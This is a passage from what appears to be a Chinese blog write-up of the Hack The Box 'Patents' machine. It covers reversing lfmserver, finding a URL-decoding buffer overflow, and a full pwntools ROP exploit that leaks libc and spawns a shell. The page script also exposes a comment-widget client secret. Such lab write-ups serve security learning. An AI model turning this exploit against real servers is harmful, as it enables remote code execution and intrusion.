[ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">       <span class="built_in">echo</span> <span class="string">"Couldn't restore file"</span></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="built_in">echo</span> <span class="string">"File restored successfully"</span></span><br><span class="line">       rm -f <span class="variable">$NEWFILE</span></span><br><span class="line">   <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"File not corrupted. Not doing anything"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<p> 这个脚本检查/var/www/html/docx2pdf/convert.php的完整性，如果被修改，会进行还原。</p>
+<h2 id="checker-py"><a href="#checker-py" class="headerlink" title="checker.py"></a>checker.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">cat checker.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> md5,recvline</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">INPUTREQ = <span class="string">"CHECK /&#123;&#125; LFM\r\nUser=&#123;&#125;\r\nPassword=&#123;&#125;\r\n\r\n&#123;&#125;\n"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">5</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: "</span> + sys.argv[<span class="number">0</span>] + <span class="string">" &lt;host&gt;:&lt;port&gt; &lt;user&gt; &lt;pass&gt; &lt;file&gt;"</span></span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">var = HOST.split(<span class="string">":"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(var) != <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: "</span> + sys.argv[<span class="number">0</span>] + <span class="string">" &lt;host&gt;:&lt;port&gt; &lt;user&gt; &lt;pass&gt; &lt;file&gt;"</span></span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    PORT = int(var[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Port number must be integer"</span></span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">HOST = var[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#print "Connecting to " + HOST + ":" + str(PORT)</span></span><br><span class="line"></span><br><span class="line">USER = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    PASS = os.environ[sys.argv[<span class="number">3</span>]]</span><br><span class="line"><span class="keyword">except</span> KeyError:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Couldn't find such password"</span></span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">FILE = sys.argv[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># At this point PASS is well-defined</span></span><br><span class="line">base = os.path.basename(FILE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    md5sum = md5(FILE)</span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"File not found locally"</span></span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">REALREQ = INPUTREQ.format(base, USER, PASS, md5sum)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">s.sendall(REALREQ)</span><br><span class="line">resp = s.recv(<span class="number">4096</span>)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#print resp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"LFM 200 OK"</span> <span class="keyword">in</span> resp:</span><br><span class="line">    <span class="comment">#print "File OK, no need to download"</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"404"</span> <span class="keyword">in</span> resp:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"File not found on server"</span></span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print "File corrupted, need to download it"</span></span><br><span class="line"></span><br><span class="line">REQ = <span class="string">"GET /&#123;&#125; LFM\r\n\r\n"</span>.format(base)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">s.sendall(REQ)</span><br><span class="line">recvline(s)</span><br><span class="line">recvline(s)</span><br><span class="line">recvline(s)</span><br><span class="line">resp = s.recv(<span class="number">8192</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#if resp[-1] == '\n':</span></span><br><span class="line"><span class="comment">#    resp = resp[:-1]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#if resp[-1] == '\r':</span></span><br><span class="line"><span class="comment">#    resp = resp[:-1]</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"&#123;&#125;.new"</span>.format(base), <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(resp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"&#123;&#125;.new"</span>.format(base)</span><br></pre></td></tr></table></figure>
+
+<p> 其中的INPUTREQ类似HTTP请求格式，它计算convert.php的md5 hash，然后构造请求数据包，发送到10.100.0.1:8888，获取响应。200或者404响应脚本退出。如果发现文件损坏，则会GET请求下载新文件。</p>
+<h1 id="usr-src-lfm"><a href="#usr-src-lfm" class="headerlink" title="/usr/src/lfm"></a>/usr/src/lfm</h1><p>存在一个lfm目录，应该是和前面的lfmserver相关，是一个git repo：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051901.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p> 可以把整个目录下载下来分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar cvf &#x2F;var&#x2F;www&#x2F;html&#x2F;docx2pdf&#x2F;src.tar lfm</span><br><span class="line">wget http:&#x2F;&#x2F;10.10.10.173&#x2F;src.tar</span><br><span class="line">tar xvf src.tar</span><br><span class="line">cd lfm</span><br></pre></td></tr></table></figure>
+
+<h2 id="lfmserver"><a href="#lfmserver" class="headerlink" title="lfmserver"></a>lfmserver</h2><p>根据git log，回退到删除文件之前的版本，得到lfmserver的二进制文件，其他版本还能够得到源码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard a900ccf7ae75b95db5f2d134d80e359a795e0cc6</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051902.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>整个过程可以结合git得到的源码</p>
+<p>IDA直接F5出错，换Ghidra，在Symbol Tree中找到entry()：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051903.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="FUN-004055c2"><a href="#FUN-004055c2" class="headerlink" title="FUN_004055c2"></a>FUN_004055c2</h2><p> 这个函数是libc_start_main()的第一个参数，即main()函数，点进去右键 edit the signature.</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051904.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>主要功能大概是检查参数数量，然后调用FUN_00404978检查参数，这里为了方便修改为check_args()</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051905.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>Defined strings里也能发现之前在bash里看到的用户名密码：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051906.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="FUN-00403ad9"><a href="#FUN-00403ad9" class="headerlink" title="FUN_00403ad9"></a>FUN_00403ad9</h2><p>Ctrl + Shift + F  查看密码的 references</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051907.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>可以看到有两次被作为函数参数使用，点击能够追踪到FUN_00403ad9函数，这个函数检查用户名和密码，检查通过会调用FUN_00402db9()：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051908.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="FUN-00402db9"><a href="#FUN-00402db9" class="headerlink" title="FUN_00402db9"></a>FUN_00402db9</h2><p>这个函数三个参数，第一个参数是请求路径，第二个是大小为128的缓冲区，最后一个参数是请求路径的长度：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051909.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>这个函数在路径中循环查找%字符，找到后会使用strtoul()将字符转换成数字，转换后的字符串保存到buf，很明显这是URL解码，server会将URL编码的字符进行解码。</p>
+<p>同样很明显，如果超出缓冲区长度，没有进行检查来停止转换，这意味着这里存在overflow，可能地利用点。</p>
+<p>回到之前的FUN_00403ad9函数，注意这里会检查文件是否存在，文件不存在会直接返回，那么就不会调用溢出的指针，我们可以通过请求一个已知文件，例如convert.php，并在末尾附加一个空字节，这样字符串在空字节处终止，也能够通过文件检查。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051910.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="Exploit-Development"><a href="#Exploit-Development" class="headerlink" title="Exploit Development"></a>Exploit Development</h1><p>常规的debug，leak addr，计算libc base，rop构造</p>
+<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ul>
+<li>url编码</li>
+<li>sock_fd = 6</li>
+<li>dup2将stdin，stdout，stderr复制到sock fd</li>
+</ul>
+<p>详情查看参考资料，视频也很详细</p>
+<p>我用的是这个里面的exp</p>
+<ul>
+<li>HTB: Patents | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2020/05/16/htb-patents.html#exploit" target="_blank" rel="noopener">https://0xdf.gitlab.io/2020/05/16/htb-patents.html#exploit</a></li>
+</ul>
+<h1 id="root-shell"><a href="#root-shell" class="headerlink" title="root shell"></a>root shell</h1><p>exp打到的shell很容易断，直接反弹shell后续操作：</p>
+<p>这里因为python版本问题format输出不正常</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052001.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>但这个root shell没有root.txt：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052002.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="lsblk-amp-mount"><a href="#lsblk-amp-mount" class="headerlink" title="lsblk &amp; mount"></a>lsblk &amp; mount</h1><p>lsblk发现root是/dev/sdb，另外还有个/dev/sda：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052003.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>sda2是根目录，我们可以挂载sda2，在mount后的目录中存在另一个root目录，得到root.txt:</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020052004.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="使用的exp"><a href="#使用的exp" class="headerlink" title="使用的exp"></a>使用的exp</h1><p>  注意libc版本，用的这个：</p>
+<p><a href="https://launchpad.net/ubuntu/cosmic/amd64/libc6/2.28-0ubuntu1" target="_blank" rel="noopener">https://launchpad.net/ubuntu/cosmic/amd64/libc6/2.28-0ubuntu1</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'local'</span>, <span class="string">'remote'</span>]:</span><br><span class="line">    print(<span class="string">"Usage: &#123;sys.argv[0]&#125; [target]\n  target is local or remote\n"</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">### Context</span></span><br><span class="line">lfmserver = ELF(<span class="string">'./lfmserver'</span>)</span><br><span class="line"><span class="keyword">if</span> target == <span class="string">'local'</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>, checksec=<span class="keyword">False</span>)</span><br><span class="line">    ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">    port = <span class="number">5000</span></span><br><span class="line">    one_gadget_offset = <span class="number">0xc84da</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment">#libc = ELF('/home/miao/Desktop/libc-database/db/libc6_2.28-0ubuntu1_amd64.so', checksec=False)</span></span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.28.so"</span>)</span><br><span class="line">    ip = <span class="string">'10.10.10.173'</span></span><br><span class="line">    port = <span class="number">8888</span></span><br><span class="line">    one_gadget_offset = <span class="number">0x501e3</span></span><br><span class="line">sock_fd = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Gadgets and payload template</span></span><br><span class="line">pop_rdi = p64(<span class="number">0x0000000000405c4b</span>)</span><br><span class="line">pop_rsi_r15 = p64(<span class="number">0x0000000000405c49</span>)</span><br><span class="line">payload = <span class="string">"CHECK /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%xx"</span> + <span class="string">"a"</span> * <span class="number">125</span> + <span class="string">"&#123;&#125; LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Stage 1: libc leak</span></span><br><span class="line">rop = pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(lfmserver.got[<span class="string">'socket'</span>]) + p64(<span class="number">0</span>) + p64(lfmserver.plt[<span class="string">'write'</span>])</span><br><span class="line"></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">p.sendline(payload.format(urllib.parse.quote(rop)))</span><br><span class="line">data = p.recvall()</span><br><span class="line">socket_addr = u64(data.split(<span class="string">b'\n'</span>)[<span class="number">1</span>][:<span class="number">8</span>].ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">log.info(<span class="string">"Found socket address:          0x&#123;socket_addr:016x&#125;"</span>)</span><br><span class="line">libc_base_addr = socket_addr - libc.symbols[<span class="string">'socket'</span>]</span><br><span class="line">log.info(<span class="string">"Calculated libc base address:  0x&#123;libc_base_addr:016x&#125;"</span>)</span><br><span class="line">one_gadget_addr = libc_base_addr + one_gadget_offset</span><br><span class="line">log.info(<span class="string">"Calculated one gadget address: 0x&#123;one_gadget_addr:016x&#125;"</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment">### Stage 2: Shell</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">rop = pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(lfmserver.plt[<span class="string">'dup2'</span>])</span><br><span class="line">rop += pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(lfmserver.plt[<span class="string">'dup2'</span>])</span><br><span class="line">rop += pop_rdi + p64(sock_fd) + pop_rsi_r15 + p64(<span class="number">2</span>) + p64(<span class="number">0</span>) + p64(lfmserver.plt[<span class="string">'dup2'</span>])</span><br><span class="line">rop += p64(one_gadget_addr)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"Sending stage two rop"</span>)</span><br><span class="line">p.sendline(payload.format(urllib.parse.quote(rop)))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">22</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a href="https://file-examples.com/index.php/sample-documents-download/sample-doc-download/" target="_blank" rel="noopener">https://file-examples.com/index.php/sample-documents-download/sample-doc-download/</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-words.txt" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-words.txt</a></li>
+<li><a href="https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf</a></li>
+<li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE</a> Injection#xxe-oob-with-dtd-and-php-filter)</li>
+<li>Hack The Box - Patents Writeup | Chr0x6eOs<br><a href="https://chr0x6eos.github.io/2020/05/16/htb-Patents.html" target="_blank" rel="noopener">https://chr0x6eos.github.io/2020/05/16/htb-Patents.html</a></li>
+<li>HTB: Patents | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2020/05/16/htb-patents.html#exploit" target="_blank" rel="noopener">https://0xdf.gitlab.io/2020/05/16/htb-patents.html#exploit</a></li>
+<li>HackTheBox - Patents - YouTube<br><a href="https://www.youtube.com/watch?v=XqsURG_agvY" target="_blank" rel="noopener">https://www.youtube.com/watch?v=XqsURG_agvY</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2020-05-21T05:05:45.669Z" itemprop="dateUpdated">2020-05-21 13:05:45</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/05/21/Patents-HackTheBox/&title=《Patents - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/05/21/Patents-HackTheBox/&title=《Patents - HackTheBox》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/05/21/Patents-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Patents - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/05/21/Patents-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/05/21/Patents-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/05/17/Cascade-HackTheBox/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Cascade - HackTheBox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
